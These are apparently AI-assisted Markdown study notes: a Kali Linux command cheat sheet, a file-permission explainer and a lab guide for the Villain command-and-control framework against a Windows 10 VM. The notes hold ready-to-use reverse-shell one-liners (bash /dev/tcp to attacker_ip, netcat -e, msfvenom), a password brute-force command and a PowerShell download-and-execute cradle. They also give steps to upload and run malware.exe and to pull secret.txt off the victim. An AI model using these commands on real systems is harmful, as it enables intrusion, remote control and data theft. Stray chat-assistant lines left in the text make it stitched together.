

---

# 🔐 Kali Linux Commands for Cyber Security

## 🔧 System & File Management

| **Command**             | **Description**                                      |
| ----------------------- | ---------------------------------------------------- |
| `ls`                    | List files in the current directory                  |
| `ls -la`                | List all files (including hidden) with detailed info |
| `ls -lh`                | List files with human-readable sizes (e.g., KB, MB)  |
| `cd /path/to/dir`       | Change to a specified directory                      |
| `pwd`                   | Print current directory path                         |
| `cp`, `mv`, `rm`        | Copy, move, or delete files/directories              |
| `mkdir`, `rmdir`        | Create or remove a directory                         |
| `cat`, `more`, `less`   | View contents of a file                              |
| `find / -name filename` | Search entire system for a file by name              |
| `locate filename`       | Quickly find files (uses a prebuilt file index)      |
| `nano`, `vim`           | Terminal-based text editors                          |
| `man ls`                | Open the manual page for the `ls` command            |

---

## 🧑‍💻 User & Privilege Management

| **Command**         | **Description**                            |
| ------------------- | ------------------------------------------ |
| `whoami`            | Show current user                          |
| `id`                | Display user ID and group memberships      |
| `sudo command`      | Run a command as a superuser               |
| `su`                | Switch to another user                     |
| `adduser`, `passwd` | Add a new user or change a user's password |
| `groups`            | Show groups the current user belongs to    |

---

This will **preview properly on GitHub**, in markdown apps, and looks clean in rendered views.

Would you like me to format the next sections too (e.g., Networking, Recon, Exploitation)?

### 🌐 **Network Scanning & Monitoring**

| Command             | Description                                    |
| ------------------- | ---------------------------------------------- |
| `ifconfig` / `ip a` | Show network interfaces and IP addresses       |
| `ping target`       | Check if a host is reachable                   |
| `netstat -tuln`     | List open ports and services                   |
| `nmap target`       | Scan target for open ports and services        |
| `traceroute target` | Trace the route packets take to a network host |
| `arp -a`            | View ARP table (IP ↔ MAC mappings)             |
| `tcpdump -i eth0`   | Capture network traffic on `eth0` interface    |
| `wireshark`         | Launch GUI packet analyzer                     |

---

### 🔍 **Reconnaissance Tools**

| Tool/Command                              | Description                                |
| ----------------------------------------- | ------------------------------------------ |
| `whois domain.com`                        | Get domain registration and ownership info |
| `nslookup domain.com`                     | Basic DNS query                            |
| `dig domain.com`                          | Advanced DNS lookup                        |
| `theharvester -d domain -l 100 -b google` | Gather emails and subdomains               |
| `recon-ng`                                | Web reconnaissance framework               |

---

### 🧱 **Vulnerability Analysis**

| Tool/Command                    | Description                             |
| ------------------------------- | --------------------------------------- |
| `nmap -sV --script vuln target` | Scan target for known vulnerabilities   |
| `nikto -h http://target`        | Web server vulnerability scan           |
| `wpscan --url http://target`    | Scan for WordPress vulnerabilities      |
| `searchsploit exploit_name`     | Search for public exploits in ExploitDB |

---

### 🎯 **Exploitation Tools**

| Tool/Command            | Description                                 |
| ----------------------- | ------------------------------------------- |
| `msfconsole`            | Launch Metasploit Framework                 |
| `msfvenom`              | Create custom payloads                      |
| `exploit/multi/handler` | Receive incoming payload/reverse shell      |
| `setoolkit`             | Social Engineering Toolkit (phishing, etc.) |

---

### 📂 **Password Attacks**

| Tool/Command                                 | Description                  |
| -------------------------------------------- | ---------------------------- |
| `hydra -l user -P passlist.txt ssh://target` | Brute-force SSH login        |
| `john /path/to/hashfile`                     | Crack password hashes        |
| `hashcat -m 0 -a 0 hash.txt wordlist.txt`    | High-speed GPU hash cracking |
| `crunch 6 8 -o wordlist.txt`                 | Generate custom wordlists    |

---

### 🐚 **Reverse Shells & Listeners**

| Command / Tool                                                                                  | Description                          |
| ----------------------------------------------------------------------------------------------- | ------------------------------------ |
| `nc -lvp 4444`                                                                                  | Start a Netcat listener on port 4444 |
| `nc target_ip 4444 -e /bin/bash`                                                                | Send a reverse shell to listener     |
| `bash -i >& /dev/tcp/attacker_ip/4444 0>&1`                                                     | Bash reverse shell (one-liner)       |
| `python -c 'import pty; pty.spawn("/bin/bash")'`                                                | Upgrade to a full TTY shell          |
| `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f elf > shell.elf` | Create reverse shell payload         |
| `socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash`                                           | Listener with Socat for stable shell |

---

### 📁 **Wordlists & Resources**

| Command / Path          | Description                             |
| ----------------------- | --------------------------------------- |
| `/usr/share/wordlists/` | Directory with common wordlists         |
| `rockyou.txt`           | Popular password list (for brute-force) |

---




---

## 📝 **Explanation of `rw-rw-rw-` in `ls -l`**

When you run:

```bash
ls -l
```

You may see output like this:

```
-rw-rw-rw- 1 user user  1024 Jul 24 10:00 file1.txt
-rw-rw-rw- 1 user user  2048 Jul 24 10:01 file2.txt
-rw-rw-rw- 1 user user  4096 Jul 24 10:02 file3.txt
```

---

### ✅ **What does `rw-rw-rw-` mean?**

This is a **permission string** that applies to a file. It’s broken down as:

```
[ - ][ rw- ][ rw- ][ rw- ]
   |     |     |     |
   |     |     |     └── Other users (world)
   |     |     └──────── Group users
   |     └────────────── Owner (user)
   └──────────────────── File type ( - = regular file, d = directory)
```

So:

* `rw-` → Read and write allowed
* `rw-` → Read and write allowed
* `rw-` → Read and write allowed
* No execute (`x`) permission for anyone

So in this case:

* Owner can read and write
* Group can read and write
* Others (everyone else) can read and write

---

### ❓ **Why does it appear three times?**

Because **each file** listed by `ls -l` has **the same permission mode**: `rw-rw-rw-`.

So if you see it three times in a row, that simply means **three files** all have the **same permissions**.

It is **not** a repetition or an error — it's **per file**.

---

### 🛑 Warning:

Files with `rw-rw-rw-` are **world-writable**, meaning **any user on the system can modify them**. That’s often a **security risk** unless you're in a controlled or testing environment.

---

Here is your **Simple Villain Framework Lab Guide** reformatted cleanly in **notes format**, perfect for GitHub README, Markdown study guides, or offline documentation.

---

# 🧪 Simple Villain Framework Lab Guide

> A step-by-step guide using **Kali Linux (Attacker)** and **Windows 10 (Victim)** in **VirtualBox**, covering payload generation, shell access, and file transfers using **Villain Framework**.

---

## 1️⃣ VirtualBox VM & Networking Setup

### Create 2 VMs:

* **Kali Linux**
* **Windows 10**

### Networking:

* Set both adapters to: `Internal Network` or `Host-Only` named `LabNet`

### Assign Static IPs:

#### Kali (in terminal):

```bash
sudo ip addr add 192.168.56.10/24 dev eth0
sudo ip link set eth0 up
```

#### Windows 10 (Control Panel → Network → Adapter Settings → IPv4):

* **IP Address:** `192.168.56.20`
* **Subnet Mask:** `255.255.255.0`
* **Gateway/DNS:** *(Leave blank)*

### Verify Connectivity:

```bash
ping 192.168.56.20
```

You should receive replies.

---

## 2️⃣ Prepare Kali Attacker

### Update system:

```bash
sudo apt update && sudo apt upgrade -y
```

### Clone Villain:

```bash
git clone https://github.com/keralahacker/Villain.git
cd Villain
```

> 📶 If GitHub is blocked (e.g. school Wi-Fi), use a VPN or mobile hotspot.

### Install Python requirements:

```bash
pip install -r requirements.txt
sudo pip install -r requirements.txt --break-system-packages
```

> If it fails, continue to the next step.

### Start Villain:

```bash
python3 Villain.py
```

You should see the `villain>` prompt.

---

## 3️⃣ Build & Deliver Your Payload

### 3.1 Generate a Reverse Shell Payload

**Syntax:**

```bash
villain> generate payload=<OS/handler/template> lhost=<YOUR_IP> [encode|obfuscate]
```

| Element   | Meaning                  | Example                   |
| --------- | ------------------------ | ------------------------- |
| OS        | Target system            | `windows`                 |
| handler   | Shell type               | `reverse_tcp`             |
| template  | Payload script type      | `powershell`              |
| lhost     | Kali IP or interface     | `192.168.56.10` or `eth0` |
| encode    | Base64-style obfuscation | *(optional)*              |
| obfuscate | String-twisting stealth  | *(optional)*              |

**Example:**

```bash
villain> generate payload=windows/reverse_tcp/powershell lhost=192.168.56.10 encode
```

This generates `payload.ps1`.

---

### 3.2 Host & Run the Payload

#### Serve with Python HTTP Server (on Kali):

```bash
cp Core/payloads/windows/reverse_tcp/powershell.ps1 ~/payload.ps1
cd ~
python3 -m http.server 8000
```

#### Execute on Windows 10 (PowerShell as Admin):

```powershell
iex (New-Object Net.WebClient).DownloadString('http://192.168.56.10:8000/payload.ps1')
```

---

## 4️⃣ Catch & Use the Reverse Shell

### List Sessions:

```bash
villain> sessions
```

### Enter a Shell:

```bash
villain> shell <SESSION_ID>
```

You’ll get a prompt like:

```powershell
PS C:\>
```

To return, use `exit` or `Ctrl+C`.

---

## 5️⃣ Uploading Files to the Victim

**Syntax:**

```bash
villain> upload <local_file_path> <remote_file_path>
```

**Example:**

```bash
villain> upload /home/kali/tools/malware.exe C:\Users\Public\malware.exe
```

Then inside the victim shell:

```powershell
PS C:\> & 'C:\Users\Public\malware.exe'
```

---

## 6️⃣ Downloading Files from the Victim

### Method 1: Use Netcat for Transfer

#### On Kali:

```bash
nc -lvp 9001 > secret.txt
```

#### On Windows:

```powershell
PS C:\> nc 192.168.56.10 9001 < C:\Users\Public\secret.txt
```

---

### Method 2: Use HTTP Server (Windows → Kali)

#### On Windows:

```powershell
cd C:\Users\Public
python3 -m http.server 8000
```

#### On Kali:

```bash
wget http://192.168.56.20:8000/secret.txt -O secret.txt
```

---

## 7️⃣ Cleaning Up & Useful Commands

### Exit without killing sessions:

```bash
villain> flee
```

### Delete saved implant metadata:

```bash
villain> purge
```

---

## 🧠 Pro Tips

* ✅ Double-check `lhost` and subnet before generating payloads.
* 🔁 Use backdoors to reuse existing payloads.
* 🔓 Disable firewall in your isolated lab network for smoother testing.

---

## 8️⃣ Broadcast Messages (C2 Chat)

To send a message to all sibling servers, prefix with `#`:

```bash
villain> # Hey team, switch to backup C2 channel
```

---

this is how u update kali with villan

